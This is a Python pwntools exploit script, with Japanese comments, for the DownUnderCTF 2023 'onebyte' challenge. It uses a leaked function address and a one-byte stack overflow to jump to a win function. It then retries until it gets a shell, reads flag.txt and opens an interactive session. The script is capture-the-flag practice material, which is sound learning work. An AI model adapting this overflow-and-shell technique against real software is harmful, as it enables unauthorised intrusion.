from pwn import *

elf = ELF('../dist/onebyte')
host = '2023.ductf.dev'
port = 30018

context.binary = elf

# initとwinのアドレスの差分
diff = 0x1203 - 0x11bd

while True:
    io = remote(host, port)
    #io = process(elf.path)

    # initのアドレスを取得
    io.recvuntil(b'Free junk: ')
    init_addr = int(io.recvline().strip(), 16)
    win_addr = init_addr + diff

    # bufの分の内容
    paylaod = p32(win_addr) * 4
    # オーバーフローの1バイト分
    paylaod += b'\x20'

    io.sendafter(b'Your turn: ', paylaod)

    try:
        io.sendline(b'cat flag.txt')
        flag = io.recvline()
        if b'DUCTF' in flag:
            print(flag)
            io.interactive()
            break
    except:
        io.close()


